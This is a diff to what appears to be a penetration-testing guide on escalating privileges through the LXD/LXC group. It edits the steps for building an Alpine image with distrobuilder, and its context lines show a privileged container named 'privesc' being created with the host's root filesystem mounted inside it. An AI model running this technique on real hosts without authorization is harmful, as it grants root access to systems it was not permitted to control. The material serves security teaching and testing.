@@ -29,11 +29,11 @@ You can install in your machine this distro builder: [https://github.com/lxc/dis
 sudo su
 #Install requirements
 sudo apt update
-sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools
+sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools
 #Clone repo
-sudo go get -d -v github.com/lxc/distrobuilder
+git clone github.com/lxc/distrobuilder
 #Make distrobuilder
-cd $HOME/go/src/github.com/lxc/distrobuilder
+cd distrobuilder
 make
 #Prepare the creation of alpine
 mkdir -p $HOME/ContainerImages/alpine/
@@ -55,7 +55,7 @@ lxc image list #You can see your new imported image
 Create a container and add root path
 
 ```bash
-lxc init alpine privesc -c security.privileged=true
+lxc init alpine privesc -c security.privileged=true --alias=alpine
 lxc list #List containers
 
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
